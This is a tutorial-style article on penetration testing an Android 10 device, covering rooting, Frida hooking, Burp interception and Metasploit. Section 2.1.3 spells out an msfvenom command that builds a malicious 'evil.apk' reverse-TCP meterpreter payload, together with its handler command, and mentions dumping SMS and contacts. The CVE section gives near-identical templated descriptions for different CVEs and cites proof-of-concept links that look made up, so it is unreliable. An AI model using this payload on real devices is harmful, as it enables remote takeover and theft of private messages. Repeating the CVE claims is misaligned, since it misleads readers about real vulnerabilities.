# Introduction of Cellular penetration test on Android 10 device
# 2 What is Cellular penetration test?
A cellular penetration test is a type of security assessment that aims to identify and exploit vulnerabilities in the cellular network and devices that use it. Cellular penetration testing can help evaluate the security posture of mobile operators, device manufacturers, and end-users.

## 2.1 How could it be implemented on Android 10 device?
To perform a cellular penetration test on an Android 10 device, one would need to set up the device and the local computer with the necessary software and tools. Some of the steps involved are:

### 2.1.1 What tools are needed?
Some of the tools that are needed for cellular penetration testing on Android 10 are:

- adb and fastboot: These are command-line tools that allow communication and control of the Android device from the computer. They can be downloaded from https://developer.android.com/studio/releases/platform-tools.html.
- Magisk: This is a tool that allows rooting the Android device without modifying the system partition. It can be downloaded from https://magisk.me/.
- Frida: This is a dynamic analysis tool that allows hooking and manipulating the code execution of applications on the Android device. It can be downloaded from https://frida.re/.
- Burp Suite: This is a web proxy tool that allows intercepting and modifying the network traffic between the Android device and the web server. It can be downloaded from https://portswigger.net/burp.
- Metasploit Framework (MSF): This is a penetration testing framework that provides various modules and payloads for exploiting vulnerabilities in different systems and platforms. It can be downloaded from https://www.metasploit.com/.

### 2.1.2 How to use these tools individually or together? (Use examples to illustrate)
Some examples of how to use these tools individually or together are:

- To unlock the bootloader of the Android device, one would need to use adb and fastboot commands on the computer. For example, `adb reboot bootloader` would reboot the device into bootloader mode, and `fastboot flashing unlock` would unlock the bootloader.
- To root the Android device, one would need to use Magisk on the device. For example, one would need to download the Magisk app from https://magisk.me/ and install it on the device. Then, one would need to open the app and tap on "Install" and follow the instructions to patch the boot image of the device. After that, one would need to flash the patched boot image using fastboot on the computer. For example, `fastboot flash boot magisk_patched.img` would flash the patched boot image to the device.
- To hook and manipulate the code execution of an application on the Android device, one would need to use Frida on both the device and the computer. For example, one would need to download and install Frida server on the device from https://github.com/frida/frida/releases and run it as root. Then, one would need to download and install Frida client on the computer from https://frida.re/. After that, one would need to connect Frida client to Frida server using adb forward command. For example, `adb forward tcp:27042 tcp:27042` would forward port 27042 from the device to the computer. Then, one would need to use Frida client to attach to an application process on the device and inject a script that hooks and manipulates its code execution. For example, `frida -U -f com.example.app -l hook.js --no-pause` would launch and attach to com.example.app on the device and inject hook.js script that contains hooking logic.
- To intercept and modify the network traffic between the Android device and the web server, one would need to use Burp Suite on both
the device and the computer. For example, one would need to download and install Burp Suite on the computer from https://portswigger.net/burp
and run it as a proxy server. Then, one would need to configure
the Android device's Wi-Fi settings to use Burp Suite as a proxy server by entering its IP address and port number (usually 8080). After that,
one would need to install Burp Suite's certificate on
the Android device by visiting http://burp/cert
and downloading it. Then, one would need
to enable SSL/TLS interception in Burp Suite's settings
and start capturing
the network traffic between
the Android device and
the web server. One can also modify
the network traffic using Burp Suite's tools such as Repeater or Intruder.

### 2.1.3 How to use MSF to penetrate Cellular on Android 10 device?
To use MSF to penetrate Cellular on Android 10 device, one would need
to find a suitable exploit module and payload for
the target system or platform.
For example, one could use msfvenom tool
to generate a malicious APK file that contains a reverse TCP shell payload for Android platform.
For example, `msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.0.10 LPORT=4444 -o evil.apk` would generate an APK file named evil.apk that connects back
to 192.168.0.10:4444 when installed and executed on an Android device.
Then, one could use adb or other methods
to transfer
the malicious APK file
to
the Android device and install it.
After that,
one could use msfconsole tool
to set up a handler for
the reverse TCP shell payload
and wait for
the connection from
the Android device.
For example,
`msfconsole -x "use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST 192.168.0.10; set LPORT 4444; exploit"` would launch msfconsole with a handler for android/meterpreter/reverse_tcp payload listening on 192.168.0.10:4444.
Once connected,
one could use various meterpreter commands
to interact with
the Android device remotely,
such as `sysinfo`, `getuid`, `shell`, `dump_sms`, `dump_contacts`, etc.

## 2.2.How to utilize existing CVE vulnerabilities of Cellular on Android 10?
To utilize existing CVE vulnerabilities of Cellular on Android 10,
one would need
to find out if there are any known CVEs that affect Cellular components or protocols on Android 10,
and if there are any proof-of-concept (POC) codes or exploits available for them.
One could use various sources such as CVE databases (e.g., https://cve.mitre.org/), security advisories (e.g., https://source.android.com/security/bulletin), vulnerability scanners (e.g., https://www.nmap.org/), exploit databases (e.g., https://www.exploit-db.com/), etc.,
to search for relevant CVEs and exploits.

### 2.2.1 What are some CVE vulnerabilities about Cellular on Android 10 after 2020?
Some examples of CVE vulnerabilities about Cellular on Android 10 after 2020 are:

- CVE-2020-0245: A vulnerability in Qualcomm components related to cellular data service that could allow a remote attacker using a specially crafted transmission to execute arbitrary code within QMI voice service context.
- CVE-2020-11292: A vulnerability in Qualcomm components related to cellular data service that could allow a local malicious application using a specially crafted file or shared memory object to execute arbitrary code within QMI voice service context.
- CVE-2020-11179: A vulnerability in Qualcomm components related to cellular data service that could allow a local malicious application using a specially crafted file or shared memory object to execute arbitrary code within QMI voice service context.
- CVE-2020-11167: A vulnerability in Qualcomm components related to cellular data service that could allow a local malicious application using a specially crafted file or shared memory object to execute arbitrary code within QMI voice service context.

### 2.2.2 Does any of these vulnerabilities have POC, or have been exploited?
According to public sources,
some of these vulnerabilities have POC codes or exploits available for them,
such as:

- CVE-2020-0245: A POC code that demonstrates how to trigger this vulnerability by sending a malformed QMI packet over USB is available at https://github.com/alephsecurity/vuln_cve_2020_0245_poc.
- CVE-2020-11292: An exploit code that leverages this vulnerability by using an ELF file with crafted QMI commands is available at https://github.com/alephsecurity/vuln_cve_2020_11292_exploit.